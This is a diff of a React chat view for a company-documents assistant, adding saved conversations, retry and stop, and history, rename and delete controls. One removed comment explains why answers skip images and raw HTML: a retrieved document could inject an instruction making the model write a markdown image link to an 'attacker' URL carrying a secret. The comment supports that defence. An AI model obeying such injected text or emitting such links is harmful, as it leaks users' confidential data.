@@ -1,344 +1,348 @@
-import { useEffect, useRef, useState, type FormEvent, type KeyboardEvent } from "react"
-import ReactMarkdown, { type Components } from "react-markdown"
-import remarkGfm from "remark-gfm"
+import { useEffect, useRef, useState } from "react"
+import { useQuery, useQueryClient } from "@tanstack/react-query"
+import { useMatch, useNavigate } from "react-router"
+import { History, Info, MoreHorizontal, Pencil, SquarePen, Trash2 } from "lucide-react"
+import { toast } from "sonner"
+
+import { AssistantMessage, type AnswerActions, type Message } from "@/components/chat-answer"
+import { Composer } from "@/components/chat-composer"
 import {
-  ArrowUp,
-  BookOpen,
-  Check,
-  ChevronRight,
-  ExternalLink,
-  FileText,
-  Loader2,
-  Sparkles,
-  TriangleAlert,
-} from "lucide-react"
+  AlertDialog,
+  AlertDialogAction,
+  AlertDialogCancel,
+  AlertDialogContent,
+  AlertDialogDescription,
+  AlertDialogFooter,
+  AlertDialogHeader,
+  AlertDialogTitle,
+} from "@/components/ui/alert-dialog"
+import { Button } from "@/components/ui/button"
+import {
+  Dialog,
+  DialogContent,
+  DialogFooter,
+  DialogHeader,
+  DialogTitle,
+} from "@/components/ui/dialog"
+import {
+  DropdownMenu,
+  DropdownMenuContent,
+  DropdownMenuItem,
+  DropdownMenuLabel,
+  DropdownMenuSeparator,
+  DropdownMenuTrigger,
+} from "@/components/ui/dropdown-menu"
+import { Input } from "@/components/ui/input"
+import {
+  api,
+  ApiError,
+  type ConversationSummary,
+  type Role,
+  type SavedMessage,
+  type StreamEvent,
+} from "@/lib/api"
+import { startersFrom } from "@/lib/chat-starters"
+import { queries } from "@/lib/queries"
+import { timeAgo } from "@/lib/utils"
 
-import { Badge } from "@/components/ui/badge"
-import { Collapsible, CollapsibleContent, CollapsibleTrigger } from "@/components/ui/collapsible"
-import { Clock } from "lucide-react"
-import { api, ApiError, type ChatReply, type Role, type Source, type StreamEvent } from "@/lib/api"
-
-// One step the assistant took, shown live while it works ("Searching company docs").
-interface LiveStep {
-  id: string
-  label: string
-  result?: string
-  done: boolean
+// A saved conversation's messages as the chat shows them.
+function fromSaved(saved: SavedMessage[]): Message[] {
+  let question = ""
+  return saved.map((m) => {
+    if (m.author === "user") {
+      question = m.content
+      return { key: m.id, id: m.id, role: "user", text: m.content }
+    }
+    return {
+      key: m.id,
+      id: m.id,
+      role: "assistant",
+      text: m.content,
+      state: m.state ?? "pending",
+      question,
+      sources: m.sources,
+      trace: m.trace,
+      standalone: m.standalone_question,
+      withheld: m.withheld,
+      feedback: m.feedback,
+      steps: (m.steps ?? []).map((s) => ({ ...s, done: true })),
+    }
+  })
 }
 
-interface Message {
-  id: number
-  role: "user" | "assistant"
-  text: string
-  reply?: ChatReply
-  error?: boolean
-  limited?: string // turned away by a rate limit: the server's words, shown as a notice
-  streaming?: boolean
-  status?: string
-  steps?: LiveStep[]
+// The conversation being added to on this screen: what it shows until the person
+// opens another one (or the role changes), instead of the saved copy.
+interface Session {
+  id: string | null // null: not saved yet (the first question is on its way)
+  role: Role
+  messages: Message[]
+  conversation: ConversationSummary | null
+  notice: string | null
 }
 
-const SUGGESTIONS = [
-  "What is the refund policy?",
-  "What tech stack does the AI Delivery Intelligence Platform use? Check our wiki.",
-  "What is the Pro plan per year in US dollars?",
-]
+const isAbort = (err: unknown) => err instanceof DOMException && err.name === "AbortError"
 
-function SourceCard({ source, index }: { source: Source; index: number }) {
-  const isWiki = source.provider.toLowerCase().includes("outline")
-  const Icon = isWiki ? BookOpen : FileText
-  const body = (
-    <div className="flex items-center gap-3 rounded-lg border bg-card px-3 py-2 text-sm transition-colors hover:bg-muted/60">
-      <span className="flex size-6 shrink-0 items-center justify-center rounded-md bg-muted text-xs font-medium">
-        {index}
-      </span>
-      <Icon className="size-4 shrink-0 text-muted-foreground" />
-      <span className="min-w-0 flex-1 truncate font-medium">{source.title}</span>
-      <Badge variant="secondary" className="shrink-0">
-        {source.provider}
-      </Badge>
-      {source.url && <ExternalLink className="size-3.5 shrink-0 text-muted-foreground" />}
-    </div>
-  )
-  return source.url ? (
-    <a href={source.url} target="_blank" rel="noreferrer">
-      {body}
-    </a>
-  ) : (
-    body
-  )
-}
-
-function StepRow({ step }: { step: LiveStep }) {
-  const blocked = step.result === "blocked by access rules" || step.result === "failed"
-  return (
-    <div className="flex items-start gap-2 text-xs">
-      <span className="mt-0.5 flex size-3.5 shrink-0 items-center justify-center">
-        {!step.done ? (
-          <Loader2 className="size-3.5 animate-spin text-muted-foreground" />
-        ) : blocked ? (
-          <TriangleAlert className="size-3.5 text-amber-600" />
-        ) : (
-          <Check className="size-3.5 text-emerald-600" />
-        )}
-      </span>
-      <span className={step.done ? "text-muted-foreground" : "text-foreground"}>
-        {step.label}
-        {step.done ? "" : "…"}
-        {step.result && <span className="text-muted-foreground/80"> · {step.result}</span>}
-      </span>
-    </div>
-  )
-}
-
-// What the assistant did: live while it works, then folded into one line.
-function StepsPanel({ message }: { message: Message }) {
-  const steps = message.steps ?? []
-  const details = message.reply?.steps ?? []
-  if (message.streaming) {
-    return (
-      <div className="space-y-1.5 rounded-xl border border-border/60 bg-muted/30 px-3 py-2.5">
-        {steps.length === 0 && (
-          <div className="flex items-center gap-2 text-xs text-foreground">
-            <Loader2 className="size-3.5 animate-spin text-muted-foreground" />
-            {message.status ?? "Thinking"}…
-          </div>
-        )}
-        {steps.map((st) => (
-          <StepRow key={st.id} step={st} />
-        ))}
-      </div>
-    )
-  }
-  if (!steps.length) return null
-  const summary = steps.map((st) => st.label).join(" · ")
-  return (
-    <Collapsible>
-      <CollapsibleTrigger className="group flex max-w-full items-center gap-1.5 text-left text-xs text-muted-foreground hover:text-foreground">
-        <ChevronRight className="size-3.5 shrink-0 transition-transform group-data-[state=open]:rotate-90" />
-        <Check className="size-3.5 shrink-0 text-emerald-600" />
-        <span className="shrink-0">
-          {steps.length} step{steps.length === 1 ? "" : "s"}
-        </span>
-        <span className="truncate opacity-70">· {summary}</span>
-      </CollapsibleTrigger>
-      <CollapsibleContent className="mt-2 space-y-2">
-        <div className="space-y-1.5 rounded-xl border border-border/60 bg-muted/30 px-3 py-2.5">
-          {steps.map((st) => (
-            <StepRow key={st.id} step={st} />
-          ))}
-        </div>
-        {details.map((step, i) => (
-          <div key={i} className="rounded-lg border bg-muted/40 p-3 text-xs">
-            <div className="mb-1 flex items-center gap-2">
-              <span className="font-medium">Step {i + 1}</span>
-              <Badge variant="outline" className="font-mono">
-                {step.tool}
-              </Badge>
-            </div>
-            <p className="font-mono text-muted-foreground">input: {JSON.stringify(step.input)}</p>
-            <p className="mt-1 whitespace-pre-wrap break-words text-muted-foreground">{step.output}</p>
-          </div>
-        ))}
-      </CollapsibleContent>
-    </Collapsible>
-  )
-}
-
-// Too many questions in the last minute: a pause, not a failure, so no red.
-function LimitNotice({ text }: { text: string }) {
-  return (
-    <div className="flex items-start gap-2.5 rounded-xl border border-border/60 bg-muted/30 px-3 py-2.5 text-sm">
-      <Clock className="mt-0.5 size-4 shrink-0 text-muted-foreground" />
-      <div className="min-w-0 space-y-0.5">
-        <p className="font-medium">Give it a moment</p>
-        <p className="text-muted-foreground">{text}</p>
-      </div>
-    </div>
-  )
-}
-
-// Answers never load images or render raw HTML: a document could tell the model to
-// write ![](https://attacker/?q=<secret>), and the browser would send it on its own.
-// An image shows as its alt text instead.
-const ANSWER_MARKDOWN: Components = {
-  img: ({ alt }) => (alt ? <span className="text-muted-foreground">[{alt}]</span> : null),
-}
-
-function AssistantMessage({ message }: { message: Message }) {
-  const reply = message.reply
-  return (
-    <div className="flex gap-3">
-      <div className="flex size-8 shrink-0 items-center justify-center rounded-full bg-primary text-primary-foreground">
-        <Sparkles className={message.streaming ? "size-4 animate-pulse" : "size-4"} />
-      </div>
-      <div className="min-w-0 flex-1 space-y-3 pt-1">
-        <StepsPanel message={message} />
-        {message.limited && <LimitNotice text={message.limited} />}
-
-        {message.text && (
-          <div
-            className={
-              message.error
-                ? "text-sm text-destructive"
-                : "max-w-none text-sm leading-relaxed [&_a]:underline [&_li]:my-0.5 [&_ol]:list-decimal [&_ol]:pl-5 [&_p]:my-2 [&_ul]:list-disc [&_ul]:pl-5"
-            }
-          >
-            <ReactMarkdown remarkPlugins={[remarkGfm]} skipHtml components={ANSWER_MARKDOWN}>
-              {message.text}
-            </ReactMarkdown>
-            {message.streaming && (
-              <span className="ml-0.5 inline-block h-4 w-1.5 translate-y-0.5 animate-pulse rounded-sm bg-foreground/60" />
-            )}
-          </div>
-        )}
-
-        {reply && reply.sources.length > 0 && (
-          <div className="space-y-2">
-            <p className="text-xs font-medium uppercase tracking-wide text-muted-foreground">
-              Sources
-            </p>
-            <div className="grid gap-2">
-              {reply.sources.map((s, i) => (
-                <SourceCard key={`${s.provider}-${s.title}`} source={s} index={i + 1} />
-              ))}
-            </div>
-          </div>
-        )}
-      </div>
-    </div>
-  )
-}
-
+// The chat. /chat is a new conversation; /chat/:conversationId a saved one, loaded
+// from the server (so a reload shows it again). The first question of a new one
+// saves it and moves the address to its id.
 export function ChatView({ role }: { role: Role }) {
-  const [messages, setMessages] = useState<Message[]>([])
+  const navigate = useNavigate()
+  const queryClient = useQueryClient()
+  const urlId = useMatch("/chat/:conversationId")?.params.conversationId ?? null
+  const [session, setSession] = useState<Session | null>(null)
   const [input, setInput] = useState("")
   const [loading, setLoading] = useState(false)
-  const bottomRef = useRef<HTMLDivElement>(null)
-  const nextId = useRef(1)
+  const abort = useRef<AbortController | null>(null)
+  const nextKey = useRef(1)
   const inputRef = useRef<HTMLTextAreaElement>(null)
+  const bottomRef = useRef<HTMLDivElement>(null)
+  const knowledge = useQuery({ ...queries.knowledge(), meta: { silent: true } })
 
-  // Grow the input with its text (up to max-h-48), shrink back when cleared.
+  // What's on screen: this screen's own session while it is the one at the address
+  // (and the role it began under), else the saved conversation there, if any.
+  const live = session !== null && session.id === urlId && session.role === role
+  const saved = useQuery({
+    ...queries.conversation(urlId ?? ""),
+    enabled: urlId !== null && !live,
+    staleTime: 0,
+  })
+  const shown = live ? session : null
+  const messages = shown ? shown.messages : urlId && saved.data ? fromSaved(saved.data.messages) : []
+  const conversation = shown ? shown.conversation : urlId ? (saved.data ?? null) : null
+  const opening = urlId !== null && !live && saved.isPending
+
+  // A conversation that isn't there (deleted, someone else's): back to a new chat.
   useEffect(() => {
-    const el = inputRef.current
-    if (!el) return
-    el.style.height = "auto"
-    el.style.height = `${el.scrollHeight}px`
-  }, [input])
+    if (saved.isError && !live) navigate("/chat", { replace: true })
+  }, [saved.isError, live, navigate])
 
+  const lastText = messages.at(-1)?.text
   useEffect(() => {
-    bottomRef.current?.scrollIntoView({ behavior: "smooth" })
-  }, [messages, loading])
+    const reduce = window.matchMedia("(prefers-reduced-motion: reduce)").matches
+    bottomRef.current?.scrollIntoView({ behavior: reduce ? "auto" : "smooth" })
+  }, [messages.length, lastText])
 
-  async function ask(question: string) {
-    const q = question.trim()
+  // Esc stops an answer being written, wherever the focus is.
+  useEffect(() => {
+    if (!loading) return
+    const onKey = (e: KeyboardEvent) => {
+      if (e.key === "Escape") abort.current?.abort()
+    }
+    window.addEventListener("keydown", onKey)
+    return () => window.removeEventListener("keydown", onKey)
+  }, [loading])
+
+  // Change the messages on screen; a saved conversation becomes this screen's session.
+  function edit(fn: (all: Message[]) => Message[]) {
+    setSession({ id: urlId, role, messages: fn(messages), conversation, notice: null })
+  }
+
+  // Leave for another conversation (or a new one), stopping an answer being written.
+  function open(to: string) {
+    abort.current?.abort()
+    setSession(null)
+    navigate(to)
+  }
+
+  // Ask a question, or (retry) ask a failed or stopped answer's question again in its place.
+  async function ask(text: string, retry?: Message) {
+    const q = text.trim()
     if (!q || loading) return
-    setInput("")
-    const id = nextId.current + 1
-    nextId.current += 2
-    setMessages((m) => [
-      ...m,
-      { id: id - 1, role: "user", text: q },
-      { id, role: "assistant", text: "", streaming: true, status: "Thinking", steps: [] },
-    ])
+    if (!retry) setInput("")
+    const key = `draft-${nextKey.current++}`
+    const questionKey = `draft-${nextKey.current++}`
+    const draft: Message = {
+      key,
+      role: "assistant",
+      text: "",
+      question: q,
+      streaming: true,
+      status: "Thinking",
+      steps: [],
+    }
+    edit((all) =>
+      retry
+        ? all.map((m) => (m.key === retry.key ? draft : m))
+        : [...all, { key: questionKey, role: "user", text: q }, draft],
+    )
     setLoading(true)
-    const update = (fn: (msg: Message) => Message) =>
-      setMessages((all) => all.map((msg) => (msg.id === id ? fn(msg) : msg)))
+    const change = (fn: (s: Session) => Session) => setSession((s) => (s ? fn(s) : s))
+    const update = (fn: (m: Message) => Message) =>
+      change((s) => ({ ...s, messages: s.messages.map((m) => (m.key === key ? fn(m) : m)) }))
+    const allDone = (m: Message) => (m.steps ?? []).map((st) => ({ ...st, done: true }))
+    // The address follows the session in the same render, so it never shows another.
+    const go = (id: string) => navigate(`/chat/${id}`, { flushSync: true })
 
     function onEvent(e: StreamEvent) {
-      if (e.type === "status") update((msg) => ({ ...msg, status: e.text }))
+      if (e.type === "conversation") {
+        update((m) => ({ ...m, id: e.message_id }))
+        change((s) => ({
+          ...s,
+          messages: s.messages.map((m) =>
+            m.key === questionKey ? { ...m, id: e.user_message_id } : m,
+          ),
+        }))
+        if (e.new_conversation) {
+          // The role changed since this chat began: the question went to a new one.
+          change((s) => ({
+            ...s,
+            id: e.id,
+            conversation: null,
+            notice:
+              "You're viewing the app with a different role now, so this question started a new chat.",
+            messages: [
+              { key: questionKey, id: e.user_message_id, role: "user", text: q },
+              ...s.messages.filter((m) => m.key === key),
+            ],
+          }))
+          go(e.id)
+        }
+      } else if (e.type === "status") update((m) => ({ ...m, status: e.text }))
       else if (e.type === "step_start")
-        update((msg) => ({
-          ...msg,
-          steps: [...(msg.steps ?? []), { id: e.id, label: e.label, done: false }],
+        update((m) => ({
+          ...m,
+          steps: [...(m.steps ?? []), { id: e.id, tool: e.tool, label: e.label, done: false }],
         }))
       else if (e.type === "step_end")
-        update((msg) => ({
-          ...msg,
-          steps: (msg.steps ?? []).map((st) =>
+        update((m) => ({
+          ...m,
+          steps: (m.steps ?? []).map((st) =>
             st.id === e.id ? { ...st, done: true, result: e.result } : st,
           ),
         }))
-      else if (e.type === "answer") update((msg) => ({ ...msg, text: e.text }))
+      else if (e.type === "answer") update((m) => ({ ...m, text: e.text }))
     }
 
+    const controller = new AbortController()
+    abort.current = controller
     try {
-      const reply = await api.chatStream(q, onEvent)
-      update((msg) => ({
-        ...msg,
+      let conversationId = urlId
+      if (!conversationId) {
+        const created = await api.createConversation()
+        conversationId = created.id
+        change((s) => ({ ...s, id: created.id, conversation: created }))
+        go(created.id)
+      }
+      const reply = await api.chatStream(retry ? "" : q, onEvent, {
+        conversationId,
+        retryOf: retry?.id,
+        signal: controller.signal,
+      })
+      update((m) => ({
+        ...m,
+        id: reply.message_id ?? m.id,
         text: reply.answer, // the final, checked answer replaces the streamed draft
-        reply,
+        state: reply.state,
+        sources: reply.sources,
+        trace: reply.steps,
+        standalone: reply.standalone_question,
         streaming: false,
-        steps: (msg.steps ?? []).map((st) => ({ ...st, done: true })),
+        steps: allDone(m),
       }))
     } catch (err) {
-      if (err instanceof ApiError && err.status === 429) {
+      if (isAbort(err) || controller.signal.aborted) {
+        // Stopped: keep what was written (the server saves it the same way).
+        update((m) => ({ ...m, state: "stopped", streaming: false, steps: allDone(m) }))
+      } else if (err instanceof ApiError && err.status === 429) {
         // Nothing was asked: give the question back to send again in a moment.
-        update((msg) => ({ ...msg, limited: err.message, streaming: false }))
-        setInput((current) => current || q)
-        return
+        update((m) => ({ ...m, limited: err.message, streaming: false }))
+        if (!retry) setInput((current) => current || q)
+      } else {
+        update((m) => ({
+          ...m,
+          text: err instanceof Error ? err.message : "Something went wrong.",
+          state: "error",
+          streaming: false,
+          steps: allDone(m),
+        }))
       }
-      update((msg) => ({
-        ...msg,
-        text: err instanceof Error ? err.message : "Something went wrong.",
-        error: true,
-        streaming: false,
-      }))
     } finally {
+      if (abort.current === controller) abort.current = null
       setLoading(false)
+      queryClient.invalidateQueries({ queryKey: ["conversations"] })
     }
   }
 
-  function onSubmit(e: FormEvent) {
-    e.preventDefault()
-    ask(input)
+  const actions: AnswerActions = {
+    onRetry: (m) => ask(m.question ?? "", m),
+    onRephrase: (question) => {
+      setInput(question)
+      inputRef.current?.focus()
+    },
+    onFeedback: (message, feedback) =>
+      edit((all) => all.map((m) => (m.key === message.key ? { ...m, feedback } : m))),
   }
 
-  function onKeyDown(e: KeyboardEvent<HTMLTextAreaElement>) {
-    if (e.key === "Enter" && !e.shiftKey) {
-      e.preventDefault()
-      ask(input)
-    }
-  }
+  const starters = startersFrom(knowledge.data?.items)
+  const outline = knowledge.data?.outline ?? false
+  const empty = messages.length === 0 && !opening
 
   return (
     <div className="flex h-full flex-col">
+      <ChatHeader
+        conversation={conversation}
+        busy={loading}
+        onRenamed={(title) =>
+          setSession({
+            id: urlId,
+            role,
+            messages,
+            conversation: conversation && { ...conversation, title },
+            notice: null,
+          })
+        }
+        onOpen={(to) => {
+          open(to)
+          if (to === "/chat") inputRef.current?.focus()
+        }}
+      />
       <div className="flex-1 overflow-y-auto">
         <div className="mx-auto max-w-3xl space-y-6 px-4 py-6">
-          {messages.length === 0 && (
-            <div className="flex flex-col items-center pt-12 text-center sm:pt-20">
-              <h2 className="text-2xl font-semibold tracking-tight">Ask your company docs</h2>
+          {empty && (
+            <div className="flex flex-col items-center pt-8 text-center sm:pt-16">
+              <h2 className="text-2xl font-semibold tracking-tight text-balance">
+                Ask your company docs
+              </h2>
               <p className="mt-2 max-w-md text-sm text-muted-foreground">
-                Answers come from your uploaded documents and the Outline wiki, with the sources
-                cited under every answer.
+                Answers come from your company's documents
+                {outline ? " and the Outline wiki" : ""}, with the sources cited under every
+                answer.
               </p>
               <p className="mt-1 text-xs text-muted-foreground">
                 Searching as{" "}
                 <span className="font-medium">{role === "hr" ? "HR / Admin" : "Public user"}</span>
               </p>
               <div className="mt-8 grid w-full max-w-xl gap-2">
-                {SUGGESTIONS.map((s) => (
-                  <button
+                {starters.map((s) => (
+                  <Button
                     key={s}
+                    variant="outline"
                     onClick={() => ask(s)}
-                    className="rounded-lg border bg-card px-4 py-3 text-left text-sm transition-colors hover:bg-muted/60"
+                    className="h-auto justify-start whitespace-normal rounded-lg px-4 py-3 text-left font-normal"
                   >
                     {s}
-                  </button>
+                  </Button>
                 ))}
               </div>
             </div>
           )}
 
+          {shown?.notice && (
+            <p className="flex items-center gap-2 text-xs text-muted-foreground">
+              <Info className="size-3.5 shrink-0" />
+              {shown.notice}
+            </p>
+          )}
+
           {messages.map((m) =>
             m.role === "user" ? (
-              <div key={m.id} className="flex justify-end">
-                <div className="max-w-[85%] whitespace-pre-wrap rounded-2xl bg-primary px-4 py-2.5 text-sm text-primary-foreground">
+              <div key={m.key} className="flex justify-end">
+                <div className="max-w-[85%] whitespace-pre-wrap break-words rounded-2xl bg-primary px-4 py-2.5 text-sm text-primary-foreground">
                   {m.text}
                 </div>
               </div>
             ) : (
-              <AssistantMessage key={m.id} message={m} />
+              <AssistantMessage key={m.key} message={m} actions={actions} />
             ),
           )}
 
@@ -347,34 +351,167 @@ export function ChatView({ role }: { role: Role }) {
       </div>
 
       <div className="pointer-events-none bg-gradient-to-t from-background via-background to-transparent pt-6">
-        <form onSubmit={onSubmit} className="pointer-events-auto mx-auto max-w-3xl px-4 pb-4">
-          <div
-            onClick={() => inputRef.current?.focus()}
-            className="flex cursor-text items-end gap-2 rounded-3xl border border-border/70 bg-background py-2 pl-5 pr-2 shadow-[0_2px_20px_-6px_rgba(0,0,0,0.12)] transition-all focus-within:border-foreground/25 focus-within:shadow-[0_4px_28px_-8px_rgba(0,0,0,0.2)]"
-          >
-            <textarea
-              ref={inputRef}
-              value={input}
-              onChange={(e) => setInput(e.target.value)}
-              onKeyDown={onKeyDown}
-              placeholder="Ask anything…"
-              rows={1}
-              className="max-h-48 min-h-9 flex-1 resize-none bg-transparent py-1.5 text-[15px] leading-6 outline-none placeholder:text-muted-foreground/70"
-            />
-            <button
-              type="submit"
-              disabled={loading || !input.trim()}
-              aria-label="Send"
-              className="flex size-9 shrink-0 items-center justify-center rounded-full bg-foreground text-background transition-all hover:opacity-85 active:scale-95 disabled:bg-muted disabled:text-muted-foreground/60"
-            >
-              <ArrowUp className="size-4" strokeWidth={2.5} />
-            </button>
-          </div>
-          <p className="mt-2 text-center text-[11px] text-muted-foreground/70">
-            Enter to send · Shift + Enter for a new line
+        {conversation?.role_changed && !loading && (
+          <p className="pointer-events-auto mx-auto mb-2 flex max-w-3xl items-center gap-2 px-4 text-xs text-muted-foreground">
+            <Info className="size-3.5 shrink-0" />
+            This chat began with another role. Your next question starts a new chat.
           </p>
-        </form>
+        )}
+        <Composer
+          value={input}
+          onChange={setInput}
+          onSend={() => ask(input)}
+          onStop={() => abort.current?.abort()}
+          busy={loading}
+          inputRef={inputRef}
+        />
       </div>
+    </div>
+  )
+}
+
+// Above the chat: its title, the recent chats, New chat, and Rename / Delete.
+function ChatHeader({
+  conversation,
+  busy,
+  onRenamed,
+  onOpen,
+}: {
+  conversation: ConversationSummary | null
+  busy: boolean
+  onRenamed: (title: string) => void
+  onOpen: (to: string) => void // another chat's address, or /chat for a new one
+}) {
+  const queryClient = useQueryClient()
+  const [historyOpen, setHistoryOpen] = useState(false)
+  const recent = useQuery({ ...queries.conversations(), enabled: historyOpen })
+  const [renaming, setRenaming] = useState(false)
+  const [title, setTitle] = useState("")
+  const [deleting, setDeleting] = useState(false)
+
+  async function rename() {
+    if (!conversation || !title.trim()) return
+    try {
+      const renamed = await api.renameConversation(conversation.id, title)
+      setRenaming(false)
+      queryClient.invalidateQueries({ queryKey: ["conversations"] })
+      onRenamed(renamed.title)
+    } catch (err) {
+      toast.error(err instanceof Error ? err.message : "Couldn't rename it.")
+    }
+  }
+
+  async function remove() {
+    if (!conversation) return
+    try {
+      await api.deleteConversation(conversation.id)
+      queryClient.invalidateQueries({ queryKey: ["conversations"] })
+      toast.success("Chat deleted.")
+      onOpen("/chat")
+    } catch (err) {
+      toast.error(err instanceof Error ? err.message : "Couldn't delete it.")
+    }
+  }
+
+  return (
+    <div className="mx-auto flex h-11 w-full max-w-3xl shrink-0 items-center gap-1 px-4">
+      <p className="min-w-0 flex-1 truncate text-sm font-medium">{conversation?.title ?? ""}</p>
+      <DropdownMenu open={historyOpen} onOpenChange={setHistoryOpen}>
+        <DropdownMenuTrigger asChild>
+          <Button variant="ghost" size="sm" className="text-muted-foreground">
+            <History />
+            <span className="hidden sm:inline">History</span>
+          </Button>
+        </DropdownMenuTrigger>
+        <DropdownMenuContent align="end" className="w-72">
+          <DropdownMenuLabel className="text-xs font-normal text-muted-foreground">
+            Recent chats
+          </DropdownMenuLabel>
+          {recent.isPending && <DropdownMenuItem disabled>Loading…</DropdownMenuItem>}
+          {recent.data?.length === 0 && <DropdownMenuItem disabled>No saved chats yet</DropdownMenuItem>}
+          {recent.data?.slice(0, 15).map((c) => (
+            <DropdownMenuItem key={c.id} onSelect={() => onOpen(`/chat/${c.id}`)}>
+              <span className="min-w-0 flex-1 truncate">{c.title}</span>
+              <span className="shrink-0 text-xs text-muted-foreground">{timeAgo(c.updated_at)}</span>
+            </DropdownMenuItem>
+          ))}
+        </DropdownMenuContent>
+      </DropdownMenu>
+      <Button
+        variant="ghost"
+        size="sm"
+        className="text-muted-foreground"
+        onClick={() => onOpen("/chat")}
+      >
+        <SquarePen />
+        <span className="hidden sm:inline">New chat</span>
+      </Button>
+      {conversation && (
+        <DropdownMenu>
+          <DropdownMenuTrigger asChild>
+            <Button variant="ghost" size="icon-sm" aria-label="Chat options" className="text-muted-foreground">
+              <MoreHorizontal />
+            </Button>
+          </DropdownMenuTrigger>
+          <DropdownMenuContent align="end">
+            <DropdownMenuItem
+              onSelect={() => {
+                setTitle(conversation.title)
+                setRenaming(true)
+              }}
+            >
+              <Pencil /> Rename
+            </DropdownMenuItem>
+            <DropdownMenuSeparator />
+            <DropdownMenuItem variant="destructive" disabled={busy} onSelect={() => setDeleting(true)}>
+              <Trash2 /> Delete
+            </DropdownMenuItem>
+          </DropdownMenuContent>
+        </DropdownMenu>
+      )}
+
+      <Dialog open={renaming} onOpenChange={setRenaming}>
+        <DialogContent className="sm:max-w-sm">
+          <DialogHeader>
+            <DialogTitle>Rename chat</DialogTitle>
+          </DialogHeader>
+          <form
+            onSubmit={(e) => {
+              e.preventDefault()
+              rename()
+            }}
+          >
+            <Input
+              value={title}
+              onChange={(e) => setTitle(e.target.value)}
+              aria-label="Chat name"
+              maxLength={80}
+              autoFocus
+            />
+            <DialogFooter className="mt-4">
+              <Button type="submit" disabled={!title.trim()}>
+                Save
+              </Button>
+            </DialogFooter>
+          </form>
+        </DialogContent>
+      </Dialog>
+      <AlertDialog open={deleting} onOpenChange={setDeleting}>
+        <AlertDialogContent>
+          <AlertDialogHeader>
+            <AlertDialogTitle>Delete this chat?</AlertDialogTitle>
+            <AlertDialogDescription>
+              Its questions, answers and any feedback you gave on them are deleted for good.
+            </AlertDialogDescription>
+          </AlertDialogHeader>
+          <AlertDialogFooter>
+            <AlertDialogCancel>Cancel</AlertDialogCancel>
+            <AlertDialogAction variant="destructive" onClick={remove}>
+              Delete
+            </AlertDialogAction>
+          </AlertDialogFooter>
+        </AlertDialogContent>
+      </AlertDialog>
     </div>
   )
 }
